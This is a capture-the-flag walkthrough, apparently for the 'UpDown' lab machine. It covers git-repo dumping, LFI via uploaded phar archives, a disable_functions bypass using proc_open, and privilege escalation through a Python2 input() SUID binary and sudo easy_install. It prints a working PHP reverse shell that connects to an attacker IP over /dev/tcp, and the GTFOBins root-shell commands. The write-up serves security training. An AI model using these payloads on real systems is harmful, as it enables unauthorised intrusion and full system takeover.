---
description: >-
  LFI to RCE using PHAR files while bypassing disabled_functions, followed by
  abuse of SUID and sudo.
---

# UpDown

## Enumeration

As per usual, we knock out a quick `nmap`:

```bash
$ nmap -p- -sC -sV 10.10.11.177 -oA nmap/basic.nmp
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

It appears to be running `Apache` on `Ubuntu`, including a webserber titled _Is My Website Up?_

## Webserver

A quick look on the IP gives us a basic page. It appears to be an application that checks for you whether or not a website it up:

<figure><img src="../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

We can see at the bottom that `siteisup.htb` is the domain, so we add it to `/etc/hosts`. The website we are served, however, is still the same.

### Website Analysis

I listen with `sudo nc -nvlp 80` but if we put in our IP, we get an interesting message:

<figure><img src="../../.gitbook/assets/image (38).png" alt=""><figcaption><p>Hacking attempt was detected !</p></figcaption></figure>

If we put in `http://` it works, though. There is probably some check to detect the protocol the request uses. It does appear to just be a GET request

```bash
$ sudo nc -nvlp 80
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.11.177.
Ncat: Connection from 10.10.11.177:43618.
GET / HTTP/1.1
Host: 10.10.14.22
User-Agent: siteisup.htb
Accept: */*
```

Nothing of note here, except confirmation that the domain is `siteisup.htb`. On the website there is a massive delay and it says it's down:

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption><p>It's down</p></figcaption></figure>

This makes sense as we are not sending a response, so it has no way of telling. If we instead serve port 80 with a python `SimpleHTTPServer`, which has a response, we are told it's up:

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

There is once again no additional data:

```bash
$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.177 - - [22/Jan/2023 15:15:54] "GET / HTTP/1.1" 200 -
```

If we turn on `Debug Mode`, the website prints out the headers and the HTML data.

We can also realise that we can use `http://127.0.0.1` as input so SSRF could be possible. If we try and use other wrappers like `file://` or `php://` then it breaks and we get the **Hacking attempt was detected !** message again.

{% hint style="info" %}
It's not _all_ wrappers that get blocked, as ippsec showed in [his video](https://www.youtube.com/watch?v=yW\_lxWB1Yd0), as `ftp` and `gopher` both work fine.
{% endhint %}

### Gobuster

We can run some brute force scripts in the background for files and directories while we probe manually:

```
$ gobuster dir -u siteisup.htb -w /tools/SecLists/Discovery/Web-Content/raft-large-words.txt -x php
```

Gobuster detects that there is a `/dev` directory! This looks like the only useful thing it finds, as basically everything else is status code `403`. Connection to `/dev` just loads up a blank page with no information.

But what if we bruteforce under `/dev`? In fact, we hit the jackpot - there's a `.git` directory!&#x20;

## Git

We'll use a tool called [`git-dumper`](https://github.com/arthaud/git-dumper) to dump the contents of the Git repo:

```bash
$ git_dumper.py http://siteisup.htb/dev/.git/ files/
```

The contents are interesting. First we see `index.php`, which looks like this:

```html
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}	
?>

```

Essentially, it checks the `page` parameter; if it doesn't contain strings like `bin` or `etc`, it will append `.php` to the end and serve it back. If it does, it simply renders `checker.php`. `checker.php` is the file for the main page we see on a normal connectiong, which checks if a website is up or not.

There is clearly LFI here, but made slightly more difficult by the blacklist and the addition of `.php` onto the end of a filename.

Additionally, we can dump more details from Git using the `git log` command. A couple of intersting commits come up if that happens:

```
commit 61e5cc0550d44c08b6c316d4f04d3fcc7783ae71

    Delete .htpasswd

commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

commit bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:37:20 2021 +0200

    Update .htaccess
    
    New technique in header to protect our dev vhost.
```

There is very potentially some interesting information in `.htpasswd` and `.htaccess`, and the mention of a `dev` vhost is useful too - there may be a `dev.siteisup.htb`. We'll add this to our hosts file, but if we try to connect, it tells us it's `Forbidden` to access that resource. We've at least confirmed that the subdomain exists and is treated differently.

### .htpasswd

If we checkout the commit `8812785e31c879261050e72e20f298ae8c43b565` using `git checkout`, we can see that `.htpasswd`exists, but it's empty:

```bash
$ cat .htpasswd 

```

### .htaccess

`.htaccess` is much more intersting:

```bash
$ cat .htaccess 
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

This tells us there is a special header that needs to be set called `Special-Dev` with the value `only4dev`. COnsidering the description of the commit is `New technique in header to protect our dev vhost` and `dev.siteisup.htb` is Forbidden, it's likely for that. We can check using BurpSuite:

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

And it looks like it is!

## Dev Website

To make it easier for us, we're gonna get BurpSuite to add the header for us with its proxy (thanks to ippsec for this!). We can go to `Match and Replace` under Proxy Options:

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

And we can access it successfully in the browser:

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Fiddling around with the website, we realise it reflects the git repository perfectly - the hyperlink for the Admin Page adds `?page=admin` to the request, which then spits out the contents of `admin.php`. Clearly, the LFI works.

### LFI Exploitation

A logical route here would be to upload our own file and then LFI it for RCE. However, there are two issues with this.

Firstly, the server checks the file extension, and denies uploading a fair few of them:

```php
$ext = getExtension($file);
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)) {
    die("Extension not allowed!");
}
```

Secondly, the server **appends** `.php` to the `page` parameter of the GET request:

```php
if($page && !preg_match("/bin|usr|home|var|etc/i",$page)) {
    include($_GET['page'] . ".php");
}
```

We have to somehow bypass these restrictions to get proper LFI.

If we have a proper look at the code, we realise that it all happens very quickly:

```php
# Check if extension is allowed.
$ext = getExtension($file);
if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)) {
	die("Extension not allowed!");
}

# Create directory to upload our file.
$dir = "uploads/".md5(time())."/";
if(!is_dir($dir)) {
	mkdir($dir, 0770, true);
}

# Upload the file.
$final_path = $dir.$file;
move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");

# Read the uploaded file.
$websites = explode("\n",file_get_contents($final_path));

foreach($websites as $site) {
    $site=trim($site);
    if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)) {
	$check=isitup($site);
	if($check){
	    echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
	} else {
	    echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
	}	
    } else {
	echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
    }
}

# Delete the uploaded file.
@unlink($final_path);
```

So after all the checks, it:

* Uploads it to `uploads/`, under a folder by time
* Reads all the lines in the file, putting them into a list
* Queries each element of the list to see if it's up
* Deletes the file

So it seems like it expects a list of websites to check, then once that's done deletes them immediately.

Note that if the webserver **doesn't respond**, it hangs for a period of time - this is the **massive delay** we noticed right away. We can use this to our advantage and keep the server running, leaving the file up.

#### File Upload Attempt

We make a very simple `test.php`:

```php
<?php system("ls"); ?>
```

As we predicted, the server rejects the file. If we rename it to `test.txt` and try again, the upload is successful. If we go to `http://dev.siteisup.htb/uploads/`, we see the file gets deleted immediately. Let's add our own IP and see if it hangs long enough for us to actually get it:

```php
10.10.14.22
<?php system("ls"); ?>
```

Still nothing. The resposne is very quick on the original site, so it probably detected the socket was closed. If we open the socket but don't respond, for example with `netcat`, it might delay:

```bash
$ sudo nc -nvlp 80
```

And now if we run over to `uploads` we can see the file!

<figure><img src="../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

We can actually also add the `-k` flag to the above `nc` command to keep the listening persist over multiple connections. I'll have this running in the background while I tinker with what can be done.

#### PHAR Files

PHP has its own archives called **phar** files, where you essentially package up PHP files into a zip file. The cool thing about a phar file is that we can [use the `phar://` stream wrapper to access a PHP script **inside the phar file**](https://www.php.net/manual/en/phar.using.intro.php).

The way this works is that we can have a file with the `.php` extension, then in the `page` parameter of the GET request we can use the `phar://` wrapper to access the PHP file **inside** it.

We'll make `test.php` really simple to start with:

```php
<?php echo "test"  ?>
```

We then compress it into a phar file:

```bash
$ zip test.phar test.php
```

The upload works! Let's try and access the file itself. In BurpSuite, we'll use Repeater to query for the file. Note that **the server appends the `.php` for us - that's half the reason we have to do it this way**! So don't include the extension in the `page` parameter.

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

It worked! Now let's do a crazier command, like `system("ls")`:

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Huh, it's an **Internal Server Error**. Considering that the previous attempt worked well, chances are [some PHP functions are disabled](https://www.php.net/manual/en/ini.core.php#ini.disable-functions). This is done using `disabled_functions`, and we can check by running `phpinfo()`, so let's do that:

```
disable_functions:

pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
```

There are a **lot** of disabled functions, but one that is not disabled is `proc_open()`. This can be found using the tool [dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser), as recommended by [ippsec](https://www.youtube.com/watch?v=yW\_lxWB1Yd0) and [0xdf](https://0xdf.gitlab.io/2023/01/21/htb-updown.html#devsiteisuphtb). A `proc_open()` reverse shell can be pretty simple:

```php
<?php
        $descriptor_spec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
        );
        $cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.22/4000 0>&1'";
        
        proc_open($cmd, $descriptor_spec, $pipes);
?>
```

A basic reverse shell to port 4000. Let's do the exact same thing and pray it works.

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

Which it does! We upgrade the shell quickly using

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Privesc to Developer

A quick check in `/home` tells us there is a `developer` user. If we go into their home directory then `/dev`, there is a SUID binary named `siteisup` with the source code `siteisup.py`. We can read `siteisup.py`:

```python
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
	print "Website is up"
else:
	print "Website is down"
```

We can immediately spot this is python2, and even more importantly it's using `input()` in python2 - which can easily lead to code execution. If we run `./siteisup`, we get prompted for the URL. If we enter a simple `os.system` command, we get a response:

```bash
$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:__import__('os').system('id')
__import__('os').system('id')
uid=1002(developer) gid=33(www-data) groups=33(www-data)
Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 4, in <module>
    page = requests.get(url)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 61, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 515, in request
    prep = self.prepare_request(req)
  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 453, in prepare_request
    hooks=merge_hooks(request.hooks, self.hooks),
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 318, in prepare
    self.prepare_url(url, params)
  File "/usr/local/lib/python2.7/dist-packages/requests/models.py", line 392, in prepare_url
    raise MissingSchema(error)
requests.exceptions.MissingSchema: Invalid URL '0': No scheme supplied. Perhaps you meant http://0?
```

Aside from the errors, we can see it works! Now we can run `__import__('os').system('bash')` and get a shell as `developer`. I'll grab the `id_rsa` in `.ssh`, call it dev.key and SSH in:

```bash
$ ssh -i dev.key developer@10.10.11.177
```

And now we have a shell as `developer` and can read `user.txt`!

## Privesc to Root

We can check our `sudo` permissions:

```
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

We have `sudo` permissions to run `easy_install`. We can use[ GTFOBins to find an easy sudo privesc for `easy_install`](https://gtfobins.github.io/gtfobins/easy\_install/):

```
developer@updown:~$ cd /tmp/
developer@updown:/tmp$ TF=$(mktemp -d)
developer@updown:/tmp$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
developer@updown:/tmp$ sudo easy_install $TF
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing tmp.uxu7JoSg3E
Writing /tmp/tmp.uxu7JoSg3E/setup.cfg
Running setup.py -q bdist_egg --dist-dir /tmp/tmp.uxu7JoSg3E/egg-dist-tmp-SX0ArL
# whoami 
root
```

And from there we easily read `root.txt`.
